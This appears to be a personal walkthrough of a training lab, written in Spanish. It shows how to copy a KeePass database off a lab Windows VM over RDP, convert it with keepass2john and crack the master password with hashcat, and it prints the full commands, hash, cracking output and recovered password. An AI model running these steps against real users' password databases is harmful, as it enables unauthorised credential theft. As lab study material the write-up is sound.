# Walk: Password Attacks - Password Manager - VM #1
## Fecha: 22/02/2025
## Host: Windows
## IP: 192.168.155.203
## Objetivo
Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title "User Company Password".
## Herramientas
1. xfreerdp
2. keepass2john
3. hashcat
## Procedimiento y comandos
#### Paso 1: Nos conectamos al cliente windows por RDP.
- Compartimos el directorio **_/tmp_** de nuestro kali en caso de que tengamos que descargar u obtener un archivo.
  - `xfreerdp /v:192.168.155.203 /u:jason /p:lab +clipboard /cert:ignore /drive:/tmp`
  -  Descargamos en nuestro kali copiando el archivo **Database.kdbx** en el directorio compartido _**/tmp**_
#### Paso 2: Formateamos el .kdbx y guardamos la salida en un .hash:
- `keepass2john Database.kdbx > keepass.hash`
- Al observar el archivo notamos:
```
cat keepass.hash  
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```
 - Adecuamos el .hash quitando **_"Database:"_**
#### Paso 3: Ejecutamos hashcat:
Antes de ejecutar hashcat para crackear el hash, buscamos el modo correspondiente a KeePass:
- `hashcat --help | grep -i "KeePass"`
```
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
```
> Procedemos a ejecutar hashcat
- `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`
```
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d...7496c1
Time.Started.....: Sat Feb 22 00:20:49 2025, (35 secs)
Time.Estimated...: Sat Feb 22 00:21:24 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/rockyou-30000.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    94299 H/s (9.05ms) @ Accel:128 Loops:60 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3213312/430331550000 (0.00%)
Rejected.........: 0/3213312 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:3137-3138 Iteration:0-60
Candidate.Engine.: Device Generator
Candidates.#1....: 123456123! -> bethany123!
Hardware.Mon.#1..: Temp: 57c Util: 91%

Started: Sat Feb 22 00:19:19 2025
Stopped: Sat Feb 22 00:21:25 2025
```
#### Paso 4: Obtenemos el flag:
- El password obtenido del comando anterior es _**qwertyuiop123!**_
Desde el cliente Windows ahora podemos acceder al Password Manager.
